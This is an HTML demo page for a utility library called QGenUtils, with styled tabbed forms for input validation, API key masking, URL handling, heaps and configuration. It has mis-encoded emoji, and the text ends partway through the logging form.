<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>QGenUtils - Comprehensive Demo</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --primary: #2563eb;
            --primary-dark: #1d4ed8;
            --secondary: #10b981;
            --danger: #ef4444;
            --warning: #f59e0b;
            --info: #3b82f6;
            --dark: #1f2937;
            --light: #f3f4f6;
            --border: #e5e7eb;
            --shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24);
            --shadow-lg: 0 10px 20px rgba(0,0,0,0.19), 0 6px 6px rgba(0,0,0,0.23);
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            color: var(--dark);
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }

        header {
            background: white;
            border-radius: 12px;
            padding: 30px;
            margin-bottom: 30px;
            box-shadow: var(--shadow-lg);
            text-align: center;
        }

        h1 {
            color: var(--primary);
            font-size: 2.5rem;
            margin-bottom: 10px;
        }

        .subtitle {
            color: #6b7280;
            font-size: 1.1rem;
        }

        .nav-tabs {
            display: flex;
            background: white;
            border-radius: 12px;
            padding: 10px;
            margin-bottom: 30px;
            box-shadow: var(--shadow);
            flex-wrap: wrap;
            gap: 5px;
        }

        .nav-tab {
            padding: 12px 20px;
            background: transparent;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 0.9rem;
            font-weight: 500;
            transition: all 0.3s ease;
            color: var(--dark);
        }

        .nav-tab:hover {
            background: var(--light);
        }

        .nav-tab.active {
            background: var(--primary);
            color: white;
        }

        .tab-content {
            display: none;
            background: white;
            border-radius: 12px;
            padding: 30px;
            box-shadow: var(--shadow-lg);
            animation: fadeIn 0.3s ease;
        }

        .tab-content.active {
            display: block;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .demo-section {
            margin-bottom: 40px;
            padding: 25px;
            background: var(--light);
            border-radius: 10px;
            border: 1px solid var(--border);
        }

        .demo-section h3 {
            color: var(--primary);
            margin-bottom: 20px;
            font-size: 1.3rem;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: var(--dark);
        }

        input, textarea, select {
            width: 100%;
            padding: 12px;
            border: 2px solid var(--border);
            border-radius: 8px;
            font-size: 1rem;
            transition: border-color 0.3s ease;
        }

        input:focus, textarea:focus, select:focus {
            outline: none;
            border-color: var(--primary);
        }

        .btn {
            padding: 12px 24px;
            background: var(--primary);
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 1rem;
            font-weight: 500;
            transition: all 0.3s ease;
            margin-right: 10px;
            margin-bottom: 10px;
        }

        .btn:hover {
            background: var(--primary-dark);
            transform: translateY(-2px);
            box-shadow: var(--shadow);
        }

        .btn-secondary {
            background: var(--secondary);
        }

        .btn-danger {
            background: var(--danger);
        }

        .btn-warning {
            background: var(--warning);
        }

        .result-box {
            background: white;
            border: 2px solid var(--border);
            border-radius: 8px;
            padding: 20px;
            margin-top: 20px;
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
            max-height: 400px;
            overflow-y: auto;
        }

        .success {
            border-color: var(--secondary);
            background: #f0fdf4;
        }

        .error {
            border-color: var(--danger);
            background: #fef2f2;
        }

        .warning {
            border-color: var(--warning);
            background: #fffbeb;
        }

        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
        }

        .card {
            background: white;
            border-radius: 10px;
            padding: 20px;
            box-shadow: var(--shadow);
            border: 1px solid var(--border);
        }

        .metric {
            text-align: center;
            padding: 20px;
            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
            color: white;
            border-radius: 10px;
            margin-bottom: 20px;
        }

        .metric-value {
            font-size: 2rem;
            font-weight: bold;
            margin-bottom: 5px;
        }

        .metric-label {
            font-size: 0.9rem;
            opacity: 0.9;
        }

        .progress-bar {
            width: 100%;
            height: 20px;
            background: var(--border);
            border-radius: 10px;
            overflow: hidden;
            margin: 10px 0;
        }

        .progress-fill {
            height: 100%;
            background: var(--secondary);
            transition: width 0.3s ease;
        }

        .validation-feedback {
            margin-top: 8px;
            padding: 8px 12px;
            border-radius: 6px;
            font-size: 0.9rem;
        }

        .validation-feedback.valid {
            background: #f0fdf4;
            color: var(--secondary);
            border: 1px solid var(--secondary);
        }

        .validation-feedback.invalid {
            background: #fef2f2;
            color: var(--danger);
            border: 1px solid var(--danger);
        }

        .log-entry {
            padding: 8px 12px;
            margin: 5px 0;
            border-radius: 6px;
            font-family: monospace;
            font-size: 0.9rem;
        }

        .log-entry.info { background: #eff6ff; color: var(--info); }
        .log-entry.warn { background: #fffbeb; color: var(--warning); }
        .log-entry.error { background: #fef2f2; color: var(--danger); }
        .log-entry.success { background: #f0fdf4; color: var(--secondary); }

        .feature-flag {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 15px;
            background: white;
            border-radius: 8px;
            margin-bottom: 10px;
            border: 1px solid var(--border);
        }

        /* Test Runner Styles */
        .config-options {
            display: flex;
            flex-wrap: wrap;
            gap: 15px;
            align-items: center;
        }

        .config-options label {
            display: flex;
            align-items: center;
            gap: 5px;
            margin-bottom: 0;
            font-weight: normal;
        }

        .test-controls {
            margin: 20px 0;
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
        }

        .progress-container {
            margin: 20px 0;
            padding: 20px;
            background: var(--light);
            border-radius: 10px;
            border: 1px solid var(--border);
        }

        .progress-label {
            margin-bottom: 10px;
            font-weight: 600;
            color: var(--dark);
        }

        .test-analytics {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
            margin: 20px 0;
        }

        .test-report {
            background: white;
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 20px;
            margin-top: 15px;
        }

        .test-report h3 {
            margin-bottom: 15px;
            color: var(--primary);
        }

        .report-summary {
            display: flex;
            gap: 20px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }

        .report-summary .metric {
            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
            color: white;
            padding: 15px;
            border-radius: 8px;
            text-align: center;
            min-width: 100px;
        }

        .report-summary .metric-value {
            font-size: 1.5rem;
            font-weight: bold;
            display: block;
            margin-bottom: 5px;
        }

        .report-summary .metric-label {
            font-size: 0.8rem;
            opacity: 0.9;
            text-transform: uppercase;
        }

        .report-details {
            background: #f8f9fa;
            border: 1px solid #e9ecef;
            border-radius: 6px;
            padding: 15px;
            max-height: 300px;
            overflow-y: auto;
        }

        .report-details pre {
            margin: 0;
            font-size: 12px;
            line-height: 1.4;
        }

        .toggle-switch {
            position: relative;
            width: 50px;
            height: 24px;
        }

        .toggle-switch input {
            opacity: 0;
            width: 0;
            height: 0;
        }

        .toggle-slider {
            position: absolute;
            cursor: pointer;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: #ccc;
            transition: .4s;
            border-radius: 24px;
        }

        .toggle-slider:before {
            position: absolute;
            content: "";
            height: 18px;
            width: 18px;
            left: 3px;
            bottom: 3px;
            background-color: white;
            transition: .4s;
            border-radius: 50%;
        }

        input:checked + .toggle-slider {
            background-color: var(--primary);
        }

        input:checked + .toggle-slider:before {
            transform: translateX(26px);
        }

        .password-strength {
            height: 8px;
            border-radius: 4px;
            margin-top: 8px;
            transition: all 0.3s ease;
        }

        .password-strength.weak { background: var(--danger); width: 33%; }
        .password-strength.medium { background: var(--warning); width: 66%; }
        .password-strength.strong { background: var(--secondary); width: 100%; }

        @media (max-width: 768px) {
            .container {
                padding: 10px;
            }
            
            h1 {
                font-size: 2rem;
            }
            
            .nav-tabs {
                flex-direction: column;
            }
            
            .grid {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>üöÄ QGenUtils Comprehensive Demo</h1>
            <p class="subtitle">Interactive testing playground for all utility functions and features</p>
            <p style="margin-top: 10px; color: #6b7280; font-size: 0.9rem;">
                100+ Security-First Utilities ‚Ä¢ Performance Optimized ‚Ä¢ Fully Tested ‚Ä¢ TypeScript Support
            </p>
        </header>

        <nav class="nav-tabs">
            <button class="nav-tab active" onclick="switchTab('overview')">üìä Overview</button>
            <button class="nav-tab" onclick="switchTab('validation')">‚úÖ Validation</button>
            <button class="nav-tab" onclick="switchTab('security')">üîê Security</button>
            <button class="nav-tab" onclick="switchTab('collections')">üì¶ Collections</button>
            <button class="nav-tab" onclick="switchTab('performance')">‚ö° Performance</button>
            <button class="nav-tab" onclick="switchTab('datetime')">üìÖ DateTime</button>
            <button class="nav-tab" onclick="switchTab('http')">üåê HTTP</button>
            <button class="nav-tab" onclick="switchTab('url')">üîó URL</button>
            <button class="nav-tab" onclick="switchTab('string')">üßπ String</button>
            <button class="nav-tab" onclick="switchTab('file')">üìÅ File</button>
            <button class="nav-tab" onclick="switchTab('config')">‚öôÔ∏è Config</button>
            <button class="nav-tab" onclick="switchTab('monitor')">üìà Monitor</button>
            <button class="nav-tab" onclick="switchTab('test-runner')">ü§ñ Test Runner</button>
        </nav>

        <!-- Overview Tab -->
        <div id="overview" class="tab-content active">
            <h2>üéØ Library Overview & Quick Tests</h2>
            
            <div class="grid">
                <div class="card">
                    <h4>üìä Statistics</h4>
                    <div class="performance-metrics">
                        <div class="metric">
                            <div class="metric-value">100+</div>
                            <div class="metric-label">Total Functions</div>
                        </div>
                        <div class="metric">
                            <div class="metric-value">23</div>
                            <div class="metric-label">Categories</div>
                        </div>
                        <div class="metric">
                            <div class="metric-value">500+</div>
                            <div class="metric-label">Test Cases</div>
                        </div>
                        <div class="metric">
                            <div class="metric-value">100%</div>
                            <div class="metric-label">Coverage</div>
                        </div>
                    </div>
                </div>

                <div class="card">
                    <h4>üöÄ Quick Start</h4>
                    <div class="form-group">
                        <label>Test a simple function:</label>
                        <input type="text" id="quickTest" placeholder="Enter text to test..." value="Hello, QGenUtils!">
                    </div>
                    <button class="btn" onclick="quickTestFunction()">Run Quick Test</button>
                    <div id="quickTestResult" class="result-box" style="display:none;"></div>
                </div>

                <div class="card">
                    <h4>üìö Library Info</h4>
                    <div class="result-box" style="display: block; font-family: monospace; font-size: 0.9rem;">
QGenUtils v1.0.0
Security-First Design
Performance Optimized
TypeScript Support
Node.js & Browser Ready
                    </div>
                </div>
            </div>

            <div class="demo-section">
                <h3>üéØ Interactive Feature Showcase</h3>
                <div class="grid">
                    <div class="card">
                        <h4>Input Validation</h4>
                        <input type="email" id="showcaseEmail" placeholder="test@example.com">
                        <button class="btn" onclick="validateShowcaseEmail()">Validate Email</button>
                        <div id="emailResult" class="result-box" style="display:none;"></div>
                    </div>

                    <div class="card">
                        <h4>Security Features</h4>
                        <input type="text" id="showcaseApiKey" placeholder="Enter API key to mask">
                        <button class="btn" onclick="maskShowcaseKey()">Mask API Key</button>
                        <div id="apiKeyResult" class="result-box" style="display:none;"></div>
                    </div>

                    <div class="card">
                        <h4>Performance Tools</h4>
                        <button class="btn" onclick="runPerformanceDemo()">Run Performance Demo</button>
                        <div id="perfResult" class="result-box" style="display:none;"></div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Validation Tab -->
        <div id="validation" class="tab-content">
            <h2>Input Validation & Forms</h2>
            
            <div class="grid">
                <div class="demo-section">
                    <h3>Email Validation</h3>
                    <div class="form-group">
                        <label>Email Address:</label>
                        <input type="email" id="emailInput" placeholder="Enter email to validate" oninput="validateEmail()">
                        <div id="emailFeedback"></div>
                    </div>
                </div>

                <div class="demo-section">
                    <h3>Password Strength</h3>
                    <div class="form-group">
                        <label>Password:</label>
                        <input type="password" id="passwordInput" placeholder="Enter password" oninput="checkPasswordStrength()">
                        <div id="passwordStrength" class="password-strength"></div>
                        <div id="passwordFeedback"></div>
                    </div>
                </div>

                <div class="demo-section">
                    <h3>API Key Validation</h3>
                    <div class="form-group">
                        <label>API Key:</label>
                        <input type="text" id="apiKeyInput" placeholder="Enter API key" oninput="validateApiKey()">
                        <div id="apiKeyFeedback"></div>
                    </div>
                </div>

                <div class="demo-section">
                    <h3>Currency Amount Validation</h3>
                    <div class="form-group">
                        <label>Amount:</label>
                        <input type="text" id="amountInput" placeholder="Enter amount" oninput="validateAmount()">
                        <div id="amountFeedback"></div>
                    </div>
                </div>
            </div>

            <div class="demo-section">
                <h3>Comprehensive Form Validation</h3>
                <form id="comprehensiveForm">
                    <div class="grid">
                        <div class="form-group">
                            <label>Username:</label>
                            <input type="text" id="username" required>
                        </div>
                        <div class="form-group">
                            <label>Phone:</label>
                            <input type="tel" id="phone">
                        </div>
                        <div class="form-group">
                            <label>Age:</label>
                            <input type="number" id="age" min="1" max="120">
                        </div>
                        <div class="form-group">
                            <label>Website:</label>
                            <input type="url" id="website">
                        </div>
                    </div>
                    <button type="submit" class="btn">Validate Form</button>
                </form>
                <div id="formResult" class="result-box" style="display:none;"></div>
            </div>
        </div>

        <!-- Security Tab -->
        <div id="security" class="tab-content">
            <h2>Security Features</h2>
            
            <div class="grid">
                <div class="demo-section">
                    <h3>API Key Generator</h3>
                    <div class="form-group">
                        <label>Generated API Key:</label>
                        <input type="text" id="generatedApiKey" readonly>
                    </div>
                    <button class="btn" onclick="generateApiKey()">Generate API Key</button>
                    <button class="btn btn-secondary" onclick="copyApiKey()">Copy to Clipboard</button>
                </div>

                <div class="demo-section">
                    <h3>Security Headers</h3>
                    <div class="form-group">
                        <label>Content Security Policy:</label>
                        <textarea id="cspInput" rows="3" placeholder="Enter CSP directive">default-src 'self'</textarea>
                    </div>
                    <button class="btn" onclick="validateSecurityHeaders()">Validate Headers</button>
                </div>

                <div class="demo-section">
                    <h3>Input Sanitization</h3>
                    <div class="form-group">
                        <label>Raw Input:</label>
                        <textarea id="rawInput" rows="3" placeholder="Enter potentially malicious content"></textarea>
                    </div>
                    <button class="btn" onclick="sanitizeInput()">Sanitize Input</button>
                    <div id="sanitizedResult" class="result-box" style="display:none;"></div>
                </div>

                <div class="demo-section">
                    <h3>Path Security</h3>
                    <div class="form-group">
                        <label>File Path:</label>
                        <input type="text" id="pathInput" placeholder="Enter file path to validate">
                    </div>
                    <button class="btn" onclick="validatePath()">Validate Path</button>
                    <div id="pathResult" class="result-box" style="display:none;"></div>
                </div>
            </div>

            <div class="demo-section">
                <h3>Authentication Simulation</h3>
                <div class="grid">
                    <div class="form-group">
                        <label>Password to Hash:</label>
                        <input type="password" id="hashPassword" placeholder="Enter password">
                    </div>
                    <div class="form-group">
                        <label>Stored Hash:</label>
                        <input type="text" id="storedHash" placeholder="Enter hash to verify">
                    </div>
                </div>
                <button class="btn" onclick="hashPassword()">Hash Password</button>
                <button class="btn btn-secondary" onclick="verifyPassword()">Verify Password</button>
                <div id="authResult" class="result-box" style="display:none;"></div>
            </div>
        </div>

        <!-- Performance Tab -->
        <div id="performance" class="tab-content">
            <h2>Performance Monitoring</h2>
            
            <div class="grid">
                <div class="metric">
                    <div class="metric-value" id="cpuUsage">0%</div>
                    <div class="metric-label">CPU Usage</div>
                </div>
                <div class="metric">
                    <div class="metric-value" id="memoryUsage">0%</div>
                    <div class="metric-label">Memory Usage</div>
                </div>
                <div class="metric">
                    <div class="metric-value" id="responseTime">0ms</div>
                    <div class="metric-label">Response Time</div>
                </div>
                <div class="metric">
                    <div class="metric-value" id="activeHandles">0</div>
                    <div class="metric-label">Active Handles</div>
                </div>
            </div>

            <div class="demo-section">
                <h3>Performance Optimization Tests</h3>
                <div class="form-group">
                    <label>Expensive Function Iterations:</label>
                    <input type="number" id="iterations" value="1000" min="100" max="10000">
                </div>
                <button class="btn" onclick="testMemoization()">Test Memoization</button>
                <button class="btn btn-secondary" onclick="testThrottle()">Test Throttle</button>
                <button class="btn btn-warning" onclick="testDebounce()">Test Debounce</button>
                <div id="performanceResult" class="result-box" style="display:none;"></div>
            </div>

            <div class="demo-section">
                <h3>Real-time Monitoring</h3>
                <button class="btn" onclick="startMonitoring()">Start Monitoring</button>
                <button class="btn btn-danger" onclick="stopMonitoring()">Stop Monitoring</button>
                <div id="monitoringData" class="result-box" style="display:none;"></div>
            </div>
        </div>

        <!-- Data Processing Tab -->
        <div id="data-processing" class="tab-content">
            <h2>Data Processing & Collections</h2>
            
            <div class="demo-section">
                <h3>Array Operations</h3>
                <div class="form-group">
                    <label>Sample Data (JSON Array):</label>
                    <textarea id="arrayData" rows="4" placeholder='[{"name": "John", "age": 30, "department": "Engineering"}, {"name": "Jane", "age": 25, "department": "Marketing"}]'></textarea>
                </div>
                <div class="form-group">
                    <label>Operation:</label>
                    <select id="arrayOperation">
                        <option value="group">Group By</option>
                        <option value="partition">Partition</option>
                        <option value="unique">Unique</option>
                        <option value="chunk">Chunk</option>
                        <option value="sort">Sort</option>
                        <option value="filter">Filter</option>
                    </select>
                </div>
                <div class="form-group">
                    <label>Group/Filter Key (if applicable):</label>
                    <input type="text" id="arrayKey" placeholder="e.g., department, age > 25">
                </div>
                <button class="btn" onclick="processArray()">Process Array</button>
                <div id="arrayResult" class="result-box" style="display:none;"></div>
            </div>

            <div class="demo-section">
                <h3>Object Operations</h3>
                <div class="grid">
                    <div class="form-group">
                        <label>Object 1:</label>
                        <textarea id="object1" rows="3" placeholder='{"a": 1, "b": 2}'></textarea>
                    </div>
                    <div class="form-group">
                        <label>Object 2:</label>
                        <textarea id="object2" rows="3" placeholder='{"b": 3, "c": 4}'></textarea>
                    </div>
                </div>
                <button class="btn" onclick="mergeObjects()">Deep Merge</button>
                <button class="btn btn-secondary" onclick="cloneObject()">Deep Clone</button>
                <button class="btn btn-warning" onclick="compareObjects()">Compare Objects</button>
                <div id="objectResult" class="result-box" style="display:none;"></div>
            </div>

            <div class="demo-section">
                <h3>Data Transformation</h3>
                <div class="form-group">
                    <label>Input Data:</label>
                    <textarea id="transformInput" rows="4" placeholder="Enter data to transform"></textarea>
                </div>
                <div class="form-group">
                    <label>Transform Type:</label>
                    <select id="transformType">
                        <option value="querystring">To Query String</option>
                        <option value="json">Parse JSON</option>
                        <option value="csv">Convert to CSV</option>
                        <option value="flatten">Flatten Object</option>
                    </select>
                </div>
                <button class="btn" onclick="transformData()">Transform Data</button>
                <div id="transformResult" class="result-box" style="display:none;"></div>
            </div>
        </div>

        <!-- HTTP & API Tab -->
        <div id="http-api" class="tab-content">
            <h2>HTTP & API Utilities</h2>
            
            <div class="demo-section">
                <h3>HTTP Configuration Builder</h3>
                <div class="grid">
                    <div class="form-group">
                        <label>Base URL:</label>
                        <input type="url" id="baseUrl" placeholder="https://api.example.com">
                    </div>
                    <div class="form-group">
                        <label>Timeout (ms):</label>
                        <input type="number" id="timeout" value="5000" min="1000">
                    </div>
                    <div class="form-group">
                        <label>Authorization:</label>
                        <select id="authType">
                            <option value="none">None</option>
                            <option value="bearer">Bearer Token</option>
                            <option value="basic">Basic Auth</option>
                            <option value="apikey">API Key</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label>Auth Value:</label>
                        <input type="text" id="authValue" placeholder="Token or credentials">
                    </div>
                </div>
                <button class="btn" onclick="buildHttpConfig()">Build Config</button>
                <div id="httpConfig" class="result-box" style="display:none;"></div>
            </div>

            <div class="demo-section">
                <h3>API Testing Interface</h3>
                <div class="grid">
                    <div class="form-group">
                        <label>Method:</label>
                        <select id="apiMethod">
                            <option value="GET">GET</option>
                            <option value="POST">POST</option>
                            <option value="PUT">PUT</option>
                            <option value="DELETE">DELETE</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label>Endpoint:</label>
                        <input type="text" id="apiEndpoint" placeholder="/users">
                    </div>
                </div>
                <div class="form-group">
                    <label>Request Body (JSON):</label>
                    <textarea id="requestBody" rows="3" placeholder='{"name": "Test User"}'></textarea>
                </div>
                <button class="btn" onclick="testApiEndpoint()">Test Endpoint</button>
                <div id="apiResult" class="result-box" style="display:none;"></div>
            </div>
        </div>

        <!-- Batch Processing Tab -->
        <div id="batch-processing" class="tab-content">
            <h2>Batch Processing & Concurrency</h2>
            
            <div class="demo-section">
                <h3>Concurrent Operations</h3>
                <div class="grid">
                    <div class="form-group">
                        <label>Number of Tasks:</label>
                        <input type="number" id="taskCount" value="10" min="1" max="100">
                    </div>
                    <div class="form-group">
                        <label>Concurrency Limit:</label>
                        <input type="number" id="concurrencyLimit" value="3" min="1" max="10">
                    </div>
                    <div class="form-group">
                        <label>Task Duration (ms):</label>
                        <input type="number" id="taskDuration" value="1000" min="100" max="5000">
                    </div>
                    <div class="form-group">
                        <label>Retry Attempts:</label>
                        <input type="number" id="retryAttempts" value="2" min="0" max="5">
                    </div>
                </div>
                <button class="btn" onclick="runBatchProcessing()">Run Batch Processing</button>
                <button class="btn btn-danger" onclick="cancelBatchProcessing()">Cancel</button>
                <div class="progress-bar">
                    <div id="batchProgress" class="progress-fill" style="width: 0%"></div>
                </div>
                <div id="batchResult" class="result-box" style="display:none;"></div>
            </div>

            <div class="demo-section">
                <h3>Background Jobs</h3>
                <div class="form-group">
                    <label>Job Type:</label>
                    <select id="jobType">
                        <option value="cleanup">Cleanup Job</option>
                        <option value="report">Report Generation</option>
                        <option value="notification">Send Notifications</option>
                        <option value="backup">Data Backup</option>
                    </select>
                </div>
                <div class="form-group">
                    <label>Schedule (cron expression):</label>
                    <input type="text" id="jobSchedule" placeholder="0 */6 * * *" value="0 */6 * * *">
                </div>
                <button class="btn" onclick="scheduleJob()">Schedule Job</button>
                <button class="btn btn-secondary" onclick="listJobs()">List Active Jobs</button>
                <div id="jobResult" class="result-box" style="display:none;"></div>
            </div>
        </div>

        <!-- DateTime Tab -->
        <div id="datetime" class="tab-content">
            <h2>Date & Time Utilities</h2>
            
            <div class="demo-section">
                <h3>Date Manipulation</h3>
                <div class="grid">
                    <div class="form-group">
                        <label>Base Date:</label>
                        <input type="date" id="baseDate">
                    </div>
                    <div class="form-group">
                        <label>Operation:</label>
                        <select id="dateOperation">
                            <option value="addDays">Add Days</option>
                            <option value="subtractDays">Subtract Days</option>
                            <option value="format">Format Date</option>
                            <option value="relative">Relative Time</option>
                            <option value="isValid">Validate Date</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label>Value:</label>
                        <input type="number" id="dateValue" placeholder="Days or format pattern">
                    </div>
                    <div class="form-group">
                        <label>Locale:</label>
                        <input type="text" id="dateLocale" value="en-US" placeholder="en-US, fr-FR, etc.">
                    </div>
                </div>
                <button class="btn" onclick="manipulateDate()">Process Date</button>
                <div id="dateResult" class="result-box" style="display:none;"></div>
            </div>

            <div class="demo-section">
                <h3>Time Zone Operations</h3>
                <div class="grid">
                    <div class="form-group">
                        <label>Source Time Zone:</label>
                        <select id="sourceTimezone">
                            <option value="UTC">UTC</option>
                            <option value="America/New_York">Eastern Time</option>
                            <option value="America/Los_Angeles">Pacific Time</option>
                            <option value="Europe/London">London</option>
                            <option value="Asia/Tokyo">Tokyo</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label>Target Time Zone:</label>
                        <select id="targetTimezone">
                            <option value="UTC">UTC</option>
                            <option value="America/New_York">Eastern Time</option>
                            <option value="America/Los_Angeles">Pacific Time</option>
                            <option value="Europe/London">London</option>
                            <option value="Asia/Tokyo">Tokyo</option>
                        </select>
                    </div>
                </div>
                <button class="btn" onclick="convertTimezone()">Convert Time Zone</button>
                <div id="timezoneResult" class="result-box" style="display:none;"></div>
            </div>
        </div>

        <!-- URL Utilities Tab -->
        <div id="url-utilities" class="tab-content">
            <h2>URL Processing & Utilities</h2>
            
            <div class="demo-section">
                <h3>Protocol Management</h3>
                <div class="grid">
                    <div class="form-group">
                        <label>Input URL:</label>
                        <input type="text" id="protocolInput" placeholder="example.com or http://example.com">
                    </div>
                    <div class="form-group">
                        <label>Default Protocol:</label>
                        <select id="defaultProtocol">
                            <option value="https">HTTPS</option>
                            <option value="http">HTTP</option>
                            <option value="ftp">FTP</option>
                        </select>
                    </div>
                </div>
                <button class="btn" onclick="ensureProtocol()">Ensure Protocol</button>
                <button class="btn btn-secondary" onclick="stripProtocol()">Strip Protocol</button>
                <button class="btn btn-warning" onclick="normalizeOrigin()">Normalize Origin</button>
                <div id="protocolResult" class="result-box" style="display:none;"></div>
            </div>

            <div class="demo-section">
                <h3>URL Parsing</h3>
                <div class="form-group">
                    <label>Complete URL:</label>
                    <input type="text" id="urlParseInput" placeholder="https://api.example.com/v1/users?page=1&limit=10">
                </div>
                <button class="btn" onclick="parseUrlParts()">Parse URL</button>
                <div id="urlParseResult" class="result-box" style="display:none;"></div>
            </div>

            <div class="demo-section">
                <h3>URL Validation & Security</h3>
                <div class="form-group">
                    <label>URL to Validate:</label>
                    <input type="text" id="urlValidateInput" placeholder="Enter URL for security validation">
                </div>
                <button class="btn" onclick="validateUrlSecurity()">Validate URL Security</button>
                <button class="btn btn-secondary" onclick="sanitizeUrl()">Sanitize URL</button>
                <div id="urlSecurityResult" class="result-box" style="display:none;"></div>
            </div>

            <div class="demo-section">
                <h3>Batch URL Processing</h3>
                <div class="form-group">
                    <label>URL List (one per line):</label>
                    <textarea id="urlBatchInput" rows="4" placeholder="example.com&#10;https://test.com&#10;http://api.example.com"></textarea>
                </div>
                <div class="form-group">
                    <label>Operation:</label>
                    <select id="urlBatchOperation">
                        <option value="ensure-https">Ensure HTTPS</option>
                        <option value="normalize">Normalize Origins</option>
                        <option value="strip-protocol">Strip Protocols</option>
                        <option value="validate">Validate All</option>
                    </select>
                </div>
                <button class="btn" onclick="processBatchUrls()">Process Batch</button>
                <div id="urlBatchResult" class="result-box" style="display:none;"></div>
            </div>
        </div>

        <!-- Data Structures Tab -->
        <div id="data-structures" class="tab-content">
            <h2>Data Structures & Algorithms</h2>
            
            <div class="demo-section">
                <h3>Min Heap Implementation</h3>
                <div class="grid">
                    <div class="form-group">
                        <label>Insert Values (comma-separated):</label>
                        <input type="text" id="heapInsert" placeholder="5, 3, 8, 1, 9, 2">
                    </div>
                    <div class="form-group">
                        <label>Extract Count:</label>
                        <input type="number" id="heapExtract" value="1" min="1" max="10">
                    </div>
                </div>
                <button class="btn" onclick="buildHeap()">Build Heap</button>
                <button class="btn btn-secondary" onclick="insertHeapValue()">Insert Value</button>
                <button class="btn btn-warning" onclick="extractHeapMin()">Extract Min</button>
                <button class="btn btn-danger" onclick="clearHeap()">Clear Heap</button>
                <div id="heapVisualization" class="result-box" style="display:none;"></div>
            </div>

            <div class="demo-section">
                <h3>Heap Operations Demo</h3>
                <div class="form-group">
                    <label>Random Data Size:</label>
                    <input type="number" id="randomDataSize" value="20" min="5" max="100">
                </div>
                <button class="btn" onclick="generateRandomHeap()">Generate Random Heap</button>
                <button class="btn btn-secondary" onclick="heapSortDemo()">Heap Sort Demo</button>
                <button class="btn btn-warning" onclick="heapPerformanceTest()">Performance Test</button>
                <div id="heapDemoResult" class="result-box" style="display:none;"></div>
            </div>

            <div class="demo-section">
                <h3>Priority Queue Simulation</h3>
                <div class="grid">
                    <div class="form-group">
                        <label>Task Name:</label>
                        <input type="text" id="taskName" placeholder="Enter task name">
                    </div>
                    <div class="form-group">
                        <label>Priority (1-10):</label>
                        <input type="number" id="taskPriority" value="5" min="1" max="10">
                    </div>
                </div>
                <button class="btn" onclick="addPriorityTask()">Add Task</button>
                <button class="btn btn-secondary" onclick="processNextTask()">Process Next Task</button>
                <button class="btn btn-warning" onclick="viewTaskQueue()">View Queue</button>
                <div id="priorityQueueResult" class="result-box" style="display:none;"></div>
            </div>
        </div>

        <!-- Configuration Tab -->
        <div id="config" class="tab-content">
            <h2>Configuration Management</h2>
            
            <div class="demo-section">
                <h3>Feature Flags</h3>
                <div id="featureFlags">
                    <div class="feature-flag">
                        <span>Enable Dark Mode</span>
                        <label class="toggle-switch">
                            <input type="checkbox" id="darkMode" onchange="updateFeatureFlag('darkMode')">
                            <span class="toggle-slider"></span>
                        </label>
                    </div>
                    <div class="feature-flag">
                        <span>Enable Analytics</span>
                        <label class="toggle-switch">
                            <input type="checkbox" id="analytics" onchange="updateFeatureFlag('analytics')">
                            <span class="toggle-slider"></span>
                        </label>
                    </div>
                    <div class="feature-flag">
                        <span>Enable Debug Mode</span>
                        <label class="toggle-switch">
                            <input type="checkbox" id="debugMode" onchange="updateFeatureFlag('debugMode')">
                            <span class="toggle-slider"></span>
                        </label>
                    </div>
                    <div class="feature-flag">
                        <span>Enable Beta Features</span>
                        <label class="toggle-switch">
                            <input type="checkbox" id="betaFeatures" onchange="updateFeatureFlag('betaFeatures')">
                            <span class="toggle-slider"></span>
                        </label>
                    </div>
                </div>
                <button class="btn" onclick="exportConfig()">Export Configuration</button>
                <button class="btn btn-secondary" onclick="importConfig()">Import Configuration</button>
                <div id="configResult" class="result-box" style="display:none;"></div>
            </div>

            <div class="demo-section">
                <h3>Secure Configuration</h3>
                <div class="form-group">
                    <label>Environment:</label>
                    <select id="environment">
                        <option value="development">Development</option>
                        <option value="staging">Staging</option>
                        <option value="production">Production</option>
                    </select>
                </div>
                <div class="form-group">
                    <label>Database URL:</label>
                    <input type="password" id="dbUrl" placeholder="Enter sensitive configuration">
                </div>
                <div class="form-group">
                    <label>API Secret:</label>
                    <input type="password" id="apiSecret" placeholder="Enter API secret">
                </div>
                <button class="btn" onclick="buildSecureConfig()">Build Secure Config</button>
                <div id="secureConfigResult" class="result-box" style="display:none;"></div>
            </div>
        </div>

        <!-- Logging Tab -->
        <div id="logging" class="tab-content">
            <h2>Logging & Monitoring</h2>
            
            <div class="demo-section">
                <h3>Log Dashboard</h3>
                <div class="form-group">
                    <label>Log Level:</label>
